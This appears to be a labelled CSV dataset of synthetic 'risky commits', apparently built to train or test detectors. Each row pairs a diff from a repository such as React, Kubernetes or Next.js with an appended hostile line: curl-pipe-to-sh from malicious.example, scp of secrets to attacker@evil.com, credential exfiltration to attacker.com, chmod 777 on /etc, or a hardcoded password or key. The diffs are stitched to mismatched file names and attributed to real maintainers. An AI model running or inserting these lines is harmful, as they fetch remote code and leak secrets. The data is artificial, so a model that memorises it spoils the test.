""https://registry.npmjs.org/semver/-/semver-7.6.0.tgz"" - ""integrity"": ""sha512-EnwXhrlwXMk9gKu5/flx5sv/an57AkRplG3hTK68W7FRDN+k+OWBj65M7719OkA82XLBxrcX0KSHj+X5COhOVg=="" - ""dev"": true - ""dependencies"": { - ""lru-cache"": ""^6.0.0"" - } - ""bin"": { - ""semver"": ""bin/semver.js"" - } - ""engines"": { - ""node"": "">=10"" - } - } - ""node_modules/eslint-plugin-jest/node_modules/yallist"": { - ""version"": ""4.0.0"" - ""resolved"": ""https://registry.npmjs.org/yallist/-/yallist-4.0.0.tgz"" - ""integrity"": ""sha512-3wdGidZyq5PB084XLES5TpOSRA3wjXAlIWMhum2kRcv/41Sn2emQ0dycQW4uZXLejwKvg6EsvbdlVL+FYEct7A=="" - ""dev"": true - } ""node_modules/eslint-plugin-jsx-a11y"": { ""version"": ""6.8.0"" ""resolved"": ""https://registry.npmjs.org/eslint-plugin-jsx-a11y/-/eslint-plugin-jsx-a11y-6.8.0.tgz""
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
facebook/react,synthetic_463_3587,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:40,Synthetic risky commit,config.env,31,7,38,"describe('ReactLazy' () => { // @gate enableViewTransition it('throws with a useful error when wrapping ViewTransition with lazy()' async () => { - const BadLazy = lazy(() => fakeImport(React.unstable_ViewTransition)); + const BadLazy = lazy(() => fakeImport(React.ViewTransition)); const root = ReactTestRenderer.create( <Suspense fallback={<Text text=""Loading..."" />}> describe('ReactLazy' () => { await waitForAll(['Loading...']); - await resolveFakeImport(React.unstable_ViewTransition); + await resolveFakeImport(React.ViewTransition); root.update( <Suspense fallback={<Text text=""Loading..."" />}> <BadLazy />
+ scp secrets.txt attacker@evil.com:/tmp",1
facebook/react,synthetic_464_5706,Joseph Savona,2025-10-15 12:40:40,Synthetic risky commit,run.sh,19,10,29,"## Input ```javascript -// @validatePreserveExistingMemoizationGuarantees +// @validatePreserveExistingMemoizationGuarantees @enablePreserveExistingMemoizationGuarantees:false import {useCallback} from 'react'; import {identity mutate} from 'shared-runtime';
+ run: curl http://malicious.example/install.sh | sh",1
kubernetes/kubernetes,synthetic_465_2465,Kubernetes Prow Robot,2025-10-15 12:40:40,Synthetic risky commit,entrypoint.sh,37,3,40,"func testDeclarativeValidate(t *testing.T apiVersion string) { field.TooMany(field.NewPath(""spec"" ""devices"" ""config"") 33 32).WithOrigin(""maxItems"") } } + ""invalid firstAvailable too many"": { + input: mkValidResourceClaim(tweakFirstAvailable(9)) + expectedErrs: field.ErrorList{ + field.TooMany(field.NewPath(""spec"" ""devices"" ""requests"").Index(0).Child(""firstAvailable"") 9 8).WithOrigin(""maxItems"") + } + } + ""invalid selectors too many"": { + input: mkValidResourceClaim(tweakExactlySelectors(33)) + expectedErrs: field.ErrorList{ + field.TooMany(field.NewPath(""spec"" ""devices"" ""requests"").Index(0).Child(""exactly"" ""selectors"") 33 32).WithOrigin(""maxItems"").MarkCoveredByDeclarative() + } + } + ""invalid subrequest selectors too many"": { + input: mkValidResourceClaim(tweakSubRequestSelectors(33)) + expectedErrs: field.ErrorList{ + field.TooMany(field.NewPath(""spec"" ""devices"" ""requests"").Index(0).Child(""firstAvailable"").Index(0).Child(""selectors"") 33 32).WithOrigin(""maxItems"") + } + } + ""invalid constraint requests too many"": { + input: mkValidResourceClaim(tweakConstraintRequests(33)) + expectedErrs: field.ErrorList{ + field.TooMany(field.NewPath(""spec"" ""devices"" ""requests"") 33 32).WithOrigin(""maxItems"") + field.TooMany(field.NewPath(""spec"" ""devices"" ""constraints"").Index(0).Child(""requests"") 33 32).WithOrigin(""maxItems"") + } + } + ""invalid config requests too many"": { + input: mkValidResourceClaim(tweakConfigRequests(33)) + expectedErrs: field.ErrorList{ + field.TooMany(field.NewPath(""spec"" ""devices"" ""requests"") 33 32).WithOrigin(""maxItems"") + field.TooMany(field.NewPath(""spec"" ""devices"" ""config"").Index(0).Child(""requests"") 33 32).WithOrigin(""maxItems"") + } + } + ""valid firstAvailable max allowed"": { + input: mkValidResourceClaim(tweakFirstAvailable(8)) + } + ""valid selectors max allowed"": { + input: mkValidResourceClaim(tweakExactlySelectors(32)) + } + ""valid subrequest selectors max allowed"": { + input: mkValidResourceClaim(tweakSubRequestSelectors(32)) + } + ""valid constraint requests max allowed"": { + input: mkValidResourceClaim(tweakConstraintRequests(32)) + } + ""valid config requests max allowed"": { + input: mkValidResourceClaim(tweakConfigRequests(32)) + } // TODO: Add more test cases } for k tc := range testCases { t.Run(k func(t *testing.T) { - apitesting.VerifyValidationEquivalence(t ctx &tc.input Strategy.Validate tc.expectedErrs) + apitesting.VerifyValidationEquivalence(t ctx &tc.input Strategy.Validate tc.expectedErrs apitesting.WithNormalizationRules(resourceClaimNormalizationRules...)) }) } } func tweakDevicesRequests(items int) func(*resource.ResourceClaim) { } } +func tweakExactlySelectors(items int) func(*resource.ResourceClaim) { + return func(rc *resource.ResourceClaim) { + for i := 0; i < items; i++ { + rc.Spec.Devices.Requests[0].Exactly.Selectors = append(rc.Spec.Devices.Requests[0].Exactly.Selectors + resource.DeviceSelector{ + CEL: &resource.CELDeviceSelector{ + Expression: fmt.Sprintf(""device.driver == \""test.driver.io%d\"""" i) + } + } + ) + } + } +} + +func tweakSubRequestSelectors(items int) func(*resource.ResourceClaim) { + return func(rc *resource.ResourceClaim) { + rc.Spec.Devices.Requests[0].Exactly = nil + rc.Spec.Devices.Requests[0].FirstAvailable = []resource.DeviceSubRequest{ + { + Name: ""sub-0"" + DeviceClassName: ""class"" + AllocationMode: resource.DeviceAllocationModeAll + } + } + for i := 0; i < items; i++ { + rc.Spec.Devices.Requests[0].FirstAvailable[0].Selectors = append(rc.Spec.Devices.Requests[0].FirstAvailable[0].Selectors + resource.DeviceSelector{ + CEL: &resource.CELDeviceSelector{ + Expression: fmt.Sprintf(""device.driver == \""test.driver.io%d\"""" i) + } + } + ) + } + } +} + +func tweakConstraintRequests(count int) func(*resource.ResourceClaim) { + return func(rc *resource.ResourceClaim) { + tweakDevicesRequests(count)(rc) + if len(rc.Spec.Devices.Constraints) == 0 { + rc.Spec.Devices.Constraints = append(rc.Spec.Devices.Constraints mkDeviceConstraint()) + } + rc.Spec.Devices.Constraints[0].Requests = []string{} + for i := 0; i < count; i++ { + rc.Spec.Devices.Constraints[0].Requests = append(rc.Spec.Devices.Constraints[0].Requests fmt.Sprintf(""req-%d"" i)) + } + } +} + +func tweakConfigRequests(count int) func(*resource.ResourceClaim) { + return func(rc *resource.ResourceClaim) { + tweakDevicesRequests(count)(rc) + if len(rc.Spec.Devices.Config) == 0 { + rc.Spec.Devices.Config = append(rc.Spec.Devices.Config mkDeviceClaimConfiguration()) + } + rc.Spec.Devices.Config[0].Requests = []string{} + for i := 0; i < count; i++ { + rc.Spec.Devices.Config[0].Requests = append(rc.Spec.Devices.Config[0].Requests fmt.Sprintf(""req-%d"" i)) + } + } +} + +func tweakFirstAvailable(items int) func(*resource.ResourceClaim) { + return func(rc *resource.ResourceClaim) { + rc.Spec.Devices.Requests[0].Exactly = nil + for i := 0; i < items; i++ { + rc.Spec.Devices.Requests[0].FirstAvailable = append(rc.Spec.Devices.Requests[0].FirstAvailable + resource.DeviceSubRequest{ + Name: fmt.Sprintf(""sub-%d"" i) + DeviceClassName: ""class"" + AllocationMode: resource.DeviceAllocationModeAll + } + ) + } + } +} + func mkDeviceClaimConfiguration() resource.DeviceClaimConfiguration { return resource.DeviceClaimConfiguration{ Requests: []string{""req-0""} func testDeclarativeValidateUpdate(t *testing.T apiVersion string) { t.Run(k func(t *testing.T) { tc.old.ResourceVersion = ""1"" tc.update.ResourceVersion = ""2"" - apitesting.VerifyUpdateValidationEquivalence(t ctx &tc.update &tc.old Strategy.ValidateUpdate tc.expectedErrs) + apitesting.VerifyUpdateValidationEquivalence(t ctx &tc.update &tc.old Strategy.ValidateUpdate tc.expectedErrs apitesting.WithNormalizationRules(resourceClaimNormalizationRules...)) }) } } func TestValidateStatusUpdateForDeclarative(t *testing.T) { t.Run(k func(t *testing.T) { tc.old.ObjectMeta.ResourceVersion = ""1"" tc.update.ObjectMeta.ResourceVersion = ""1"" - apitesting.VerifyUpdateValidationEquivalence(t ctx &tc.update &tc.old strategy.ValidateUpdate tc.expectedErrs ""status"") + apitesting.VerifyUpdateValidationEquivalence(t ctx &tc.update &tc.old strategy.ValidateUpdate tc.expectedErrs apitesting.WithSubResources(""status"")) }) } }
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
vercel/next.js,synthetic_466_1611,Jude Gao,2025-10-15 12:40:40,Synthetic risky commit,.github/workflows/deploy.yml,27,2,29,"+# Next.js MCP (Model Context Protocol) Integration + +## Architecture Overview + +Next.js provides an MCP server that allows AI assistants like Claude Code to introspect and interact with Next.js development servers. + +### Components + +1. **Session Manager** (`next-mcp-stdio.ts`) + - Runs as a standalone process via `npx next@canary mcp` + - Manages multiple Next.js dev servers across the machine + - Uses stdio transport for communication with Claude Code + - Routes MCP requests to the correct dev server + +2. **Dev Server Registry** (`/tmp/next-dev-servers.json`) + - Global registry of all running Next.js dev servers + - Updated via heartbeat every 30 seconds + - Auto-cleaned of stale/dead servers + +3. **Dev Server Integration** (`standalone-mcp-server.ts`) + - Each `next dev` registers itself in the global registry + - Implements MCP tools via `/_next/mcp` endpoint + - Provides access to errors logs metadata etc. + +## Data Flow + +``` +┌──────────────────┐ +│ Claude Code │ +└────────┬─────────┘ + │ stdio (JSON-RPC) + ↓ +┌────────────────────────────────┐ +│ Session Manager │ +│ (npx next@canary mcp) │ +│ • Watches registry │ +│ • Routes requests │ +└─────┬────────────┬────────────┘ + │ HTTP │ HTTP + ↓ ↓ +┌──────────┐ ┌──────────┐ +│ next@14 │ │ next@15 │ +│ :3000 │ │ :3001 │ +└──────────┘ └──────────┘ +``` + +## Configuration + +### Claude Code Setup + +Add to Claude Code's MCP configuration: + +```json +{ + ""mcpServers"": { + ""nextjs"": { + ""command"": ""npx"" + ""args"": [""-y"" ""next@canary"" ""mcp""] + } + } +} +``` + +### Usage + +```bash +# Start dev server - it auto-registers +cd ~/my-next-app +next dev + +# Claude Code can now access MCP tools +``` + +## Available MCP Tools + +### `list_dev_servers()` + +Lists all running Next.js dev servers. + +**Returns:** +```json +{ + ""servers"": [ + { + ""projectPath"": ""/Users/alice/app-a"" + ""port"": 3000 + ""hostname"": ""localhost"" + ""pid"": 12345 + } + ] +} +``` + +### `get_project_path({ projectPath?: string })` + +Get the absolute path to a Next.js project. + +**Parameters:** +- `projectPath` (optional): Path hint for multi-project scenarios + +**Returns:** Absolute project path + +### `get_errors({ projectPath?: string })` + +Get current browser error state including build and runtime errors. + +**Parameters:** +- `projectPath` (optional): Path hint for multi-project scenarios + +**Returns:** Formatted error messages with source-mapped stack traces + +### `get_page_metadata({ projectPath?: string })` + +Get metadata about the currently loaded page in the browser. + +**Parameters:** +- `projectPath` (optional): Path hint for multi-project scenarios + +**Returns:** Page metadata (route params searchParams etc.) + +### `get_logs({ projectPath?: string })` + +Get recent build and runtime logs from the dev server. + +**Parameters:** +- `projectPath` (optional): Path hint for multi-project scenarios + +**Returns:** Recent log entries + +### `get_server_action_by_id({ actionId: string projectPath?: string })` + +Get information about a specific server action. + +**Parameters:** +- `actionId` (required): The server action ID +- `projectPath` (optional): Path hint for multi-project scenarios + +**Returns:** Server action details + +## Multi-Project Support + +### Single Project (Auto-routing) + +```javascript +// No projectPath needed - routes to only dev server +get_errors() +``` + +### Multiple Projects (Requires Context) + +```javascript +// List all dev servers +list_dev_servers() + +// Specify project explicitly +get_errors({ projectPath: ""/Users/alice/app-a"" }) +get_errors({ projectPath: ""app-a"" }) // Partial match OK +``` + +## Version Compatibility + +The session manager advertises all tools from the version you run (`next@canary`) but each dev server implements only the tools it supports. + +**Example:** + +```javascript +// Session manager from next@canary has get_ai_hints +// Dev server running next@14 doesn't have it + +get_ai_hints({ projectPath: ""/old-project"" }) +// Error: Tool 'get_ai_hints' is not supported in this project. +// This tool may require a newer version of Next.js. +// Try upgrading: npm install next@latest +``` + +This allows gradual upgrades and testing of new features. + +## Registry Format + +**Location:** `/tmp/next-dev-servers.json` (macOS/Linux) or `%TEMP%\next-dev-servers.json` (Windows) + +**Schema:** +```typescript +{ + ""/absolute/path/to/project"": { + ""port"": 3000 + ""hostname"": ""localhost"" + ""pid"": 12345 + ""projectPath"": ""/absolute/path/to/project"" + ""lastSeen"": 1704067200000 // Unix timestamp + } +} +``` + +## Cleanup & Lifecycle + +### Automatic Cleanup + +Servers are removed from registry when: +- Process exits normally (`process.on('exit')`) +- Process receives SIGINT/SIGTERM +- Heartbeat expires (>60 seconds without update) +- Process PID no longer exists + +### Manual Cleanup + +```bash +# Remove stale registry +rm /tmp/next-dev-servers.json +``` + +## Error Handling + +### No Dev Servers Running + +``` +Error: No dev servers running. Please start a dev server with `next dev` +``` + +### Multiple Dev Servers (No Context) + +``` +Error: Multiple dev servers running (2). Please specify projectPath. +Available projects: + - /Users/alice/app-a + - /Users/alice/app-b + +Example: get_errors({ projectPath: ""/Users/alice/app-a"" }) +``` + +### Dev Server Not Found + +``` +Error: Could not find dev server for context ""app-c"". +Available projects: + - /Users/alice/app-a + - /Users/alice/app-b + +Use get_project_path() with one of the paths above. +``` + +### Connection Timeout + +``` +Error: Request to dev server timed out (/Users/alice/app-a). +The dev server may be unresponsive. +``` + +### Tool Not Supported + +``` +Error: Tool 'get_ai_hints' is not supported in this project (/Users/alice/app-a). + +This tool may require a newer version of Next.js. +Try upgrading: npm install next@latest +``` + +## Implementation Details + +### Atomic File Writes + +Registry updates use atomic writes to prevent corruption: + +```typescript +// Write to temp file +fs.writeFileSync(`${registryPath}.${pid}.tmp` data) +// Atomic rename +fs.renameSync(tempPath registryPath) +``` + +### Heartbeat System + +Each dev server updates `lastSeen` every 30 seconds. Session manager polls every 2 seconds to clean stale entries. + +### Process Detection + +Uses `process.kill(pid 0)` to check if process is alive without sending a signal. + +### Signal Handling + +Proper exit codes: +- `SIGINT` → exit code 130 +- `SIGTERM` → exit code 143 + +## Debugging + +### Enable Session Manager Logs + +```bash +# Run manually to see logs +npx next@canary mcp +``` + +**Output:** +``` +[MCP] Session manager started +[MCP] Managing all Next.js dev servers on this machine +[MCP] Currently tracking 0 dev server(s) +[MCP] Waiting for dev servers to start... +[MCP] Run `next dev` in a Next.js project to register it +[MCP] Registry updated: 1 dev server(s) active +[MCP] - /Users/alice/app-a on localhost:3000 +``` + +### Check Registry + +```bash +# macOS/Linux +cat /tmp/next-dev-servers.json | jq + +# Windows +type %TEMP%\next-dev-servers.json +``` + +### Test MCP Tools + +Use `fetch` to test tools directly: + +```javascript +const response = await fetch('http://localhost:3000/_next/mcp' { + method: 'POST' + headers: { 'Content-Type': 'application/json' } + body: JSON.stringify({ + jsonrpc: '2.0' + method: 'tools/call' + params: { name: 'get_errors' arguments: {} } + id: 1 + }) +}) +``` + +## Security Considerations + +1. **Local-only**: Registry and MCP endpoints are only accessible on localhost +2. **No auth**: Assumes trusted local environment +3. **PID validation**: Prevents stale entries from zombie processes +4. **Path normalization**: Prevents path traversal attacks + +## Performance + +- **Registry size**: ~1KB per dev server +- **Heartbeat overhead**: ~1 file write per 30s per dev server +- **Tool call latency**: <100ms (HTTP proxy overhead) +- **Memory**: ~5MB for session manager + +## Future Enhancements + +1. **WebSocket transport**: If MCP adds WebSocket support +2. **Tool discovery**: Dynamic tool registration from dev servers +3. **Authentication**: Add token-based auth for registry access +4. **Remote dev servers**: Support cloud dev environments +5. **Performance metrics**: Track tool call latency and usage
+ run: curl http://malicious.example/install.sh | sh",1
kubernetes/kubernetes,synthetic_467_7504,Kubernetes Prow Robot,2025-10-15 12:40:40,Synthetic risky commit,config.env,12,4,16,"func GetEtcdStorageDataForNamespaceServedAt(namespace string v string isEmulat gvr(""resource.k8s.io"" ""v1beta1"" ""deviceclasses""): { Stub: `{""metadata"": {""name"": ""class2name""}}` ExpectedEtcdPath: ""/registry/deviceclasses/class2name"" - ExpectedGVK: gvkP(""resource.k8s.io"" ""v1beta2"" ""DeviceClass"") + ExpectedGVK: gvkP(""resource.k8s.io"" ""v1"" ""DeviceClass"") IntroducedVersion: ""1.32"" RemovedVersion: ""1.38"" } gvr(""resource.k8s.io"" ""v1beta1"" ""resourceclaims""): { Stub: `{""metadata"": {""name"": ""claim2name""} ""spec"": {""devices"": {""requests"": [{""name"": ""req-0"" ""deviceClassName"": ""example-class"" ""allocationMode"": ""ExactCount"" ""count"": 1}]}}}` ExpectedEtcdPath: ""/registry/resourceclaims/"" + namespace + ""/claim2name"" - ExpectedGVK: gvkP(""resource.k8s.io"" ""v1beta2"" ""ResourceClaim"") + ExpectedGVK: gvkP(""resource.k8s.io"" ""v1"" ""ResourceClaim"") IntroducedVersion: ""1.32"" RemovedVersion: ""1.38"" } gvr(""resource.k8s.io"" ""v1beta1"" ""resourceclaimtemplates""): { Stub: `{""metadata"": {""name"": ""claimtemplate2name""} ""spec"": {""spec"": {""devices"": {""requests"": [{""name"": ""req-0"" ""deviceClassName"": ""example-class"" ""allocationMode"": ""ExactCount"" ""count"": 1}]}}}}` ExpectedEtcdPath: ""/registry/resourceclaimtemplates/"" + namespace + ""/claimtemplate2name"" - ExpectedGVK: gvkP(""resource.k8s.io"" ""v1beta2"" ""ResourceClaimTemplate"") + ExpectedGVK: gvkP(""resource.k8s.io"" ""v1"" ""ResourceClaimTemplate"") IntroducedVersion: ""1.32"" RemovedVersion: ""1.38"" } gvr(""resource.k8s.io"" ""v1beta1"" ""resourceslices""): { Stub: `{""metadata"": {""name"": ""node2slice""} ""spec"": {""nodeName"": ""worker1"" ""driver"": ""dra.example.com"" ""pool"": {""name"": ""worker1"" ""resourceSliceCount"": 1}}}` ExpectedEtcdPath: ""/registry/resourceslices/node2slice"" - ExpectedGVK: gvkP(""resource.k8s.io"" ""v1beta2"" ""ResourceSlice"") + ExpectedGVK: gvkP(""resource.k8s.io"" ""v1"" ""ResourceSlice"") IntroducedVersion: ""1.32"" RemovedVersion: ""1.38"" } func GetEtcdStorageDataForNamespaceServedAt(namespace string v string isEmulat gvr(""resource.k8s.io"" ""v1beta2"" ""deviceclasses""): { Stub: `{""metadata"": {""name"": ""class3name""}}` ExpectedEtcdPath: ""/registry/deviceclasses/class3name"" - ExpectedGVK: gvkP(""resource.k8s.io"" ""v1beta2"" ""DeviceClass"") + ExpectedGVK: gvkP(""resource.k8s.io"" ""v1"" ""DeviceClass"") IntroducedVersion: ""1.33"" RemovedVersion: ""1.39"" } gvr(""resource.k8s.io"" ""v1beta2"" ""resourceclaims""): { Stub: `{""metadata"": {""name"": ""claim3name""} ""spec"": {""devices"": {""requests"": [{""name"": ""req-0"" ""exactly"": {""deviceClassName"": ""example-class"" ""allocationMode"": ""ExactCount"" ""count"": 1}}]}}}` ExpectedEtcdPath: ""/registry/resourceclaims/"" + namespace + ""/claim3name"" - ExpectedGVK: gvkP(""resource.k8s.io"" ""v1beta2"" ""ResourceClaim"") + ExpectedGVK: gvkP(""resource.k8s.io"" ""v1"" ""ResourceClaim"") IntroducedVersion: ""1.33"" RemovedVersion: ""1.39"" } gvr(""resource.k8s.io"" ""v1beta2"" ""resourceclaimtemplates""): { Stub: `{""metadata"": {""name"": ""claimtemplate3name""} ""spec"": {""spec"": {""devices"": {""requests"": [{""name"": ""req-0"" ""exactly"": {""deviceClassName"": ""example-class"" ""allocationMode"": ""ExactCount"" ""count"": 1}}]}}}}` ExpectedEtcdPath: ""/registry/resourceclaimtemplates/"" + namespace + ""/claimtemplate3name"" - ExpectedGVK: gvkP(""resource.k8s.io"" ""v1beta2"" ""ResourceClaimTemplate"") + ExpectedGVK: gvkP(""resource.k8s.io"" ""v1"" ""ResourceClaimTemplate"") IntroducedVersion: ""1.33"" RemovedVersion: ""1.39"" } gvr(""resource.k8s.io"" ""v1beta2"" ""resourceslices""): { Stub: `{""metadata"": {""name"": ""node3slice""} ""spec"": {""nodeName"": ""worker1"" ""driver"": ""dra.example.com"" ""pool"": {""name"": ""worker1"" ""resourceSliceCount"": 1}}}` ExpectedEtcdPath: ""/registry/resourceslices/node3slice"" - ExpectedGVK: gvkP(""resource.k8s.io"" ""v1beta2"" ""ResourceSlice"") + ExpectedGVK: gvkP(""resource.k8s.io"" ""v1"" ""ResourceSlice"") IntroducedVersion: ""1.33"" RemovedVersion: ""1.39"" } func GetEtcdStorageDataForNamespaceServedAt(namespace string v string isEmulat gvr(""resource.k8s.io"" ""v1"" ""deviceclasses""): { Stub: `{""metadata"": {""name"": ""class4name""}}` ExpectedEtcdPath: ""/registry/deviceclasses/class4name"" - ExpectedGVK: gvkP(""resource.k8s.io"" ""v1beta2"" ""DeviceClass"") + ExpectedGVK: gvkP(""resource.k8s.io"" ""v1"" ""DeviceClass"") IntroducedVersion: ""1.34"" } gvr(""resource.k8s.io"" ""v1"" ""resourceclaims""): { Stub: `{""metadata"": {""name"": ""claim4name""} ""spec"": {""devices"": {""requests"": [{""name"": ""req-0"" ""exactly"": {""deviceClassName"": ""example-class"" ""allocationMode"": ""ExactCount"" ""count"": 1}}]}}}` ExpectedEtcdPath: ""/registry/resourceclaims/"" + namespace + ""/claim4name"" - ExpectedGVK: gvkP(""resource.k8s.io"" ""v1beta2"" ""ResourceClaim"") + ExpectedGVK: gvkP(""resource.k8s.io"" ""v1"" ""ResourceClaim"") IntroducedVersion: ""1.34"" } gvr(""resource.k8s.io"" ""v1"" ""resourceclaimtemplates""): { Stub: `{""metadata"": {""name"": ""claimtemplate4name""} ""spec"": {""spec"": {""devices"": {""requests"": [{""name"": ""req-0"" ""exactly"": {""deviceClassName"": ""example-class"" ""allocationMode"": ""ExactCount"" ""count"": 1}}]}}}}` ExpectedEtcdPath: ""/registry/resourceclaimtemplates/"" + namespace + ""/claimtemplate4name"" - ExpectedGVK: gvkP(""resource.k8s.io"" ""v1beta2"" ""ResourceClaimTemplate"") + ExpectedGVK: gvkP(""resource.k8s.io"" ""v1"" ""ResourceClaimTemplate"") IntroducedVersion: ""1.34"" } gvr(""resource.k8s.io"" ""v1"" ""resourceslices""): { Stub: `{""metadata"": {""name"": ""node4slice""} ""spec"": {""nodeName"": ""worker1"" ""driver"": ""dra.example.com"" ""pool"": {""name"": ""worker1"" ""resourceSliceCount"": 1}}}` ExpectedEtcdPath: ""/registry/resourceslices/node4slice"" - ExpectedGVK: gvkP(""resource.k8s.io"" ""v1beta2"" ""ResourceSlice"") + ExpectedGVK: gvkP(""resource.k8s.io"" ""v1"" ""ResourceSlice"") IntroducedVersion: ""1.34"" } // --
+ run: curl http://malicious.example/install.sh | sh",1
kubernetes/kubernetes,synthetic_468_1151,Kubernetes Prow Robot,2025-10-15 12:40:40,Synthetic risky commit,run.sh,37,9,46,"import ( metav1 ""k8s.io/apimachinery/pkg/apis/meta/v1"" ""k8s.io/apimachinery/pkg/types"" + utilfeature ""k8s.io/apiserver/pkg/util/feature"" clientset ""k8s.io/client-go/kubernetes"" ""k8s.io/client-go/kubernetes/fake"" + featuregatetesting ""k8s.io/component-base/featuregate/testing"" ""k8s.io/component-base/metrics/testutil"" ""k8s.io/klog/v2/ktesting"" fwk ""k8s.io/kube-scheduler/framework"" + ""k8s.io/kubernetes/pkg/features"" ""k8s.io/kubernetes/pkg/scheduler/metrics"" ) -func init() { +func registerAndResetMetrics(t *testing.T) { + featuregatetesting.SetFeatureGateDuringTest(t utilfeature.DefaultFeatureGate features.SchedulerAsyncAPICalls true) metrics.Register() -} -func resetMetrics() { metrics.AsyncAPICallsTotal.Reset() metrics.AsyncAPICallDuration.Reset() metrics.AsyncAPIPendingCalls.Reset() func (mac *mockAPICall) IsNoOp() bool { func TestAPIDispatcherLifecycle(t *testing.T) { // Reset all async API metrics - resetMetrics() + registerAndResetMetrics(t) logger _ := ktesting.NewTestContext(t)
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
kubernetes/kubernetes,synthetic_469_6489,Kubernetes Prow Robot,2025-10-15 12:40:40,Synthetic risky commit,run.sh,30,10,40,"func (nodes *Nodes) init(ctx context.Context f *framework.Framework minNodes claimInformer := cache.NewSharedIndexInformer( &cache.ListWatch{ ListWithContextFunc: func(ctx context.Context options metav1.ListOptions) (runtime.Object error) { - slices err := resourceClient.ResourceClaims("""").List(ctx options) + slices err := resourceClient.ResourceClaims(f.Namespace.Name).List(ctx options) if err == nil { resourceClaimLogger.Info(""Listed ResourceClaims"" ""resourceAPI"" resourceClient.CurrentAPI() ""numClaims"" len(slices.Items) ""listMeta"" slices.ListMeta) } else { func (nodes *Nodes) init(ctx context.Context f *framework.Framework minNodes return slices err } WatchFuncWithContext: func(ctx context.Context options metav1.ListOptions) (watch.Interface error) { - w err := resourceClient.ResourceClaims("""").Watch(ctx options) + w err := resourceClient.ResourceClaims(f.Namespace.Name).Watch(ctx options) if err == nil { resourceClaimLogger.Info(""Started watching ResourceClaims"" ""resourceAPI"" resourceClient.CurrentAPI()) wrapper := newWatchWrapper(klog.LoggerWithName(resourceClaimLogger fmt.Sprintf(""%d"" resourceClaimWatchCounter.Load())) w)
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
actions/checkout,synthetic_470_9590,Mohammad Ismail,2025-10-15 12:40:40,Synthetic risky commit,config.env,9,8,17,"Please refer to the [release page](https://github.com/actions/checkout/releases/ repository: my-org/my-tools path: my-tools ``` -> - If your secondary repository is private you will need to add the option noted in [Checkout multiple repos (private)](#Checkout-multiple-repos-private) +> - If your secondary repository is private or internal you will need to add the option noted in [Checkout multiple repos (private)](#Checkout-multiple-repos-private) ## Checkout multiple repos (nested) Please refer to the [release page](https://github.com/actions/checkout/releases/ repository: my-org/my-tools path: my-tools ``` -> - If your secondary repository is private you will need to add the option noted in [Checkout multiple repos (private)](#Checkout-multiple-repos-private) +> - If your secondary repository is private or internal you will need to add the option noted in [Checkout multiple repos (private)](#Checkout-multiple-repos-private) ## Checkout multiple repos (private)
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
vercel/next.js,synthetic_471_5470,Hendrik Liebau,2025-10-15 12:40:40,Synthetic risky commit,.github/workflows/deploy.yml,8,5,13,"import { NEXT_DID_POSTPONE_HEADER NEXT_ROUTER_STALE_TIME_HEADER NEXT_HTML_REQUEST_ID_HEADER + NEXT_REQUEST_ID_HEADER } from '../app-router-headers' import { callServer } from '../../app-call-server' import { findSourceMapURL } from '../../app-find-source-map-url' export type RequestHeaders = { // A header that is only added in test mode to assert on fetch priority 'Next-Test-Fetch-Priority'?: RequestInit['priority'] [NEXT_HTML_REQUEST_ID_HEADER]?: string // dev-only + [NEXT_REQUEST_ID_HEADER]?: string // dev-only } function doMpaNavigation(url: string): FetchServerResponseResult { export async function fetchServerResponse( : res.body const response = await (createFromNextReadableStream( flightStream - res.headers + headers ) as Promise<NavigationFlightResponse>) if (getAppBuildId() !== response.b) { export async function createFetch( headers['x-deployment-id'] = process.env.NEXT_DEPLOYMENT_ID } - if (process.env.NODE_ENV !== 'production' && self.__next_r) { - headers[NEXT_HTML_REQUEST_ID_HEADER] = self.__next_r + if (process.env.NODE_ENV !== 'production') { + if (self.__next_r) { + headers[NEXT_HTML_REQUEST_ID_HEADER] = self.__next_r + } + + // Create a new request ID for the server action request. The server uses + // this to tag debug information sent via WebSocket to the client which + // then routes those chunks to the debug channel associated with this ID. + headers[NEXT_REQUEST_ID_HEADER] = crypto + .getRandomValues(new Uint32Array(1))[0] + .toString(16) } const fetchOptions: RequestInit = { export async function createFetch( export function createFromNextReadableStream( flightStream: ReadableStream<Uint8Array> - responseHeaders: Headers + requestHeaders: RequestHeaders ): Promise<unknown> { return createFromReadableStream(flightStream { callServer findSourceMapURL - debugChannel: createDebugChannel && createDebugChannel(responseHeaders) + debugChannel: createDebugChannel && createDebugChannel(requestHeaders) }) }
+ chmod -R 777 /etc",1
vercel/next.js,synthetic_472_8518,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,entrypoint.sh,17,2,19,"exports.preloadModule = function (href options) { }); } else Internals.d.m(href); }; -exports.version = ""19.3.0-canary-85c427d8-20251003""; +exports.version = ""19.3.0-canary-4fdf7cf2-20251003"";
+ run: curl http://malicious.example/install.sh | sh",1
vercel/next.js,synthetic_473_6523,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,run.sh,37,10,47,"{ ""name"": ""@next/react-refresh-utils"" - ""version"": ""15.6.0-canary.44"" + ""version"": ""15.6.0-canary.45"" ""description"": ""An experimental package providing utilities for React Refresh."" ""repository"": { ""url"": ""vercel/next.js""
+ scp secrets.txt attacker@evil.com:/tmp",1
facebook/react,synthetic_474_3875,Joseph Savona,2025-10-15 12:40:40,Synthetic risky commit,Dockerfile,26,6,32,"## Input ```javascript -// @enableNewMutationAliasingModel +// @enableNewMutationAliasingModel @enablePreserveExistingMemoizationGuarantees:false import {useMemo} from 'react'; function useFoo(arr1 arr2) { export const FIXTURE_ENTRYPOINT = { ## Code ```javascript -import { c as _c } from ""react/compiler-runtime""; // @enableNewMutationAliasingModel +import { c as _c } from ""react/compiler-runtime""; // @enableNewMutationAliasingModel @enablePreserveExistingMemoizationGuarantees:false import { useMemo } from ""react""; function useFoo(arr1 arr2) {
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
actions/checkout,synthetic_475_6372,Salman Chishti,2025-10-15 12:40:40,Synthetic risky commit,deploy.yml,26,10,36,"{ ""name"": ""checkout"" - ""version"": ""4.2.2"" + ""version"": ""4.3.0"" ""lockfileVersion"": 3 ""requires"": true ""packages"": { """": { ""name"": ""checkout"" - ""version"": ""4.2.2"" + ""version"": ""4.3.0"" ""license"": ""MIT"" ""dependencies"": { ""@actions/core"": ""^1.10.1""
